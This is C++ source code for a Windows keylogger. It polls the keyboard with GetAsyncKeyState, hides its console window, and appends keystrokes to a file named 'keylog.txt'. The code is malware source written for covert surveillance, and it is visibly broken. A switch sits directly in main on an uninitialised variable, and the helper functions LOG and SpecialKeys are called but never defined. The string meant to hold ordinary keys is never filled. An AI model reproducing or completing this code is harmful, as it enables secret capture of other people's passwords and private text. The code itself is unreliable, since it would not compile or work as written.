//This program records keystrokes in a text file called "keylog.txt"

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <winuser.h>
#include <string>
#include <fstream> 
#include <iostream>
using namespace std;

int main()
{
	int S_key;
	string keystroke;
	
	
	switch (S_key) 
	{
	case VK_SPACE:
		cout << " ";
		fstream logFile;
  		logFile.open("keylog.txt", fstream::app);
  		if(logFile.is_open())
 		{
    			logFile << " ";
    			logFile.close();
  		}
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_OEM_PERIOD:
		cout << ".";
		LOG(".");
		return true;
	case VK_OEM_COMMA:
		cout << ",";
		LOG(",");
		return true;
	case VK_OEM_7:
		cout << "'";
		LOG("'");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("#CAPS_LOCK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("#UP_ARROW");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("#DOWN_ARROW");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("#LEFT_ARROW");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("#RIGHT_ARROW");
		return true;
	default: 
		return false;
	}
	
	
	ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console window
	char key = 'a';

	while (true)
  	{
		for (int key = 8; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
      			{
				SpecialKeys(S_key);
					
				if (SpecialKeys(key) == false) //Checks to see if a special key was pressed
        			{
						
					fstream logFile;
 	 				logFile.open("keylog.txt", fstream::app);
  					if(logFile.is_open())
  					{
    						logFile << keystroke;
    						logFile.close();
  					}
					
				}
			}
		}
	}
	
	
	return 0;
}
	
